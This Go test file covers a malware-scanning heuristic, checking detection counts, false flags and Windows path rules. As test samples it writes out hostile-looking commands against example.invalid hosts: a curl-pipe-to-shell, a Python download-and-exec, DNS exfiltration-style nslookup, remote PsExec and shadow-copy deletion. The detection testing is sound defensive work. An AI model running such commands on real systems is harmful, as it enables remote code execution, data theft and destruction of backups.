package main

import (
 "encoding/binary"
 "fmt"
 "os"
 "path/filepath"
 "strings"
 "testing"
)

// Stage 8 acceptance tests use unchanged Stage 6 suspicious/benign labels.
// They do not use any real malware, execute the commands, or download data.
func TestStage8NoRegressionToStage7Matrix(t *testing.T) {
 base:=t.TempDir()
 tp,fn,fp,tn:=0,0,0,0
 for i,c:=range stage6Corpus() {
  dir:=filepath.Join(base,fmt.Sprintf("case-%03d",i))
  if err:=os.MkdirAll(dir,0700);err!=nil{t.Fatal(err)}
  p:=filepath.Join(dir,c.filename)
  if err:=os.WriteFile(p,[]byte(c.content),0600);err!=nil{t.Fatal(err)}
  stat,err:=os.Stat(p);if err!=nil{t.Fatal(err)}
  got:=inspectFile(p,stat)!=nil
  switch {
  case c.suspicious && got:tp++
  case c.suspicious && !got:fn++;t.Logf("REGRESSION MISSED: %s [%s]",c.label,c.group)
  case !c.suspicious && got:fp++;t.Logf("REGRESSION FALSE FLAG: %s",c.label)
  default:tn++
  }
 }
 t.Logf("STAGE8 UNCHANGED MATRIX TP=%d FN=%d FP=%d TN=%d",tp,fn,fp,tn)
 if tp<49 || fp>1 {t.Fatalf("Stage 8 must preserve Stage 7 >=49/65 and <=1/30 false flags: got TP=%d FP=%d",tp,fp)}
}

func TestStage8ContextualRulesAndLargeJSLookalikes(t *testing.T) {
 cases:=[]struct{name,ext,content string;want bool}{
  {"Office JS scattered Python tokens",".js","function a(){return exec('hi')} function b(){return urlopen('x')} function c(){return obj.read()}",false},
  {"Office JS scattered download shell tokens",".js","const curl = 'feature';const demo = 'echo hello | sh';",false},
  {"Office JS XMLHTTP client",".js","const xhr=CreateObject('MSXML2.XMLHTTP');xhr.open('GET','/api')",false},
  {"Office JS PsExec string",".js","const example='psexec \\\\machine cmd';",false},
  {"Discord JS DNS resolver",".js","function dns(){return 'nslookup $host.example.invalid'}",false},
  {"Python download execute",".py","exec(__import__('urllib.request').request.urlopen('https://example.invalid/x').read())",true},
  {"Shell download pipeline",".sh","curl https://example.invalid/install.sh | sh",true},
  {"PowerShell dynamic DNS",".ps1","nslookup $chunk.example.invalid",true},
  {"Remote PsExec command",".cmd","psexec \\\\remote cmd",true},
  {"VBScript XMLHTTP request",".vbs","Set x = CreateObject(\"MSXML2.XMLHTTP\"): x.Open \"GET\", \"https://example.invalid\"",true},
  {"PS benign commented command",".ps1","# nslookup $chunk.example.invalid\nWrite-Host 'hello'",false},
  {"PS benign commented recovery",".cmd","rem vssadmin delete shadows /all /quiet",false},
 }
 root:=t.TempDir()
 for i,c:=range cases {
  p:=filepath.Join(root,fmt.Sprintf("sample-%03d%s",i,c.ext))
  if err:=os.WriteFile(p,[]byte(c.content),0600);err!=nil{t.Fatal(err)}
  st,err:=os.Stat(p);if err!=nil{t.Fatal(err)}
  result:=inspectFile(p,st)
  flagged:=result!=nil
  if flagged!=c.want {
   if flagged {t.Errorf("FALSE FLAG: %s reasons=%v",c.name,result.Reasons)} else {t.Errorf("MISS: %s",c.name)}
  }
 }
}

// The report identified ordinary Windows component-store executables being
// flagged solely due to their filename outside System32. Verify path handling
// without creating files inside real Windows directories.
func TestStage8WindowsComponentStorePaths(t *testing.T) {
 old,had:=os.LookupEnv("WINDIR")
 defer func(){if had{_ = os.Setenv("WINDIR",old)}else{_ = os.Unsetenv("WINDIR")}}()
 _=os.Setenv("WINDIR",`C:\Windows`)
 cases:=[]struct{p string;want bool}{
  {`c:\windows\winsxs\amd64_microsoft-windows-services\svchost.exe`,true},
  {`c:\windows\winsxs\amd64_test\winlogon.exe`,true},
  {`c:\windows\winsxs-not-real\svchost.exe`,false},
  {`c:\users\public\svchost.exe`,false},
 }
 for _,c:=range cases {if got:=isWindowsComponentStorePath(c.p);got!=c.want {t.Errorf("WinSxS %s: got %v want %v",c.p,got,c.want)}}
}

func TestStage8PEAnomalyAloneNotEnough(t *testing.T) {
 pe:=make([]byte,1024)
 copy(pe,[]byte("MZ"))
 binary.LittleEndian.PutUint32(pe[0x3c:0x40],128)
 copy(pe[128:132],[]byte{'P','E',0,0})
 binary.LittleEndian.PutUint16(pe[128+6:128+8],34)
 dir:=t.TempDir()
 p:=filepath.Join(dir,"kernel.sys")
 if err:=os.WriteFile(p,pe,0600);err!=nil {t.Fatal(err)}
 st,_:=os.Stat(p)
 if f:=inspectFile(p,st);f!=nil {t.Fatalf("Section count alone should not be presented as a malicious finding: %v",f.Reasons)}
}

func TestStage8ReproducibleReportReasonFamilies(t *testing.T) {
 // These represent 114 historical heuristic hits from the user's JSON report.
 // We cannot assert genuine false-positive resolution without scanning the
 // ORIGINAL local files, which are not present in the GitHub runner.
 benign:=[]string{
  "Downloads source content and executes it in Python",
  "Pipes remotely downloaded data to a shell",
  "Downloads a remote script through an XMLHTTP object",
  "Queries DNS with a variable subdomain",
  "Uses a remote PsExec command",
 }
 for _,rule:=range benign {if !stage8ContextualRule(rule){t.Errorf("old context-free rule still enabled: %s",rule)}}
 _=strings.Builder{}
}
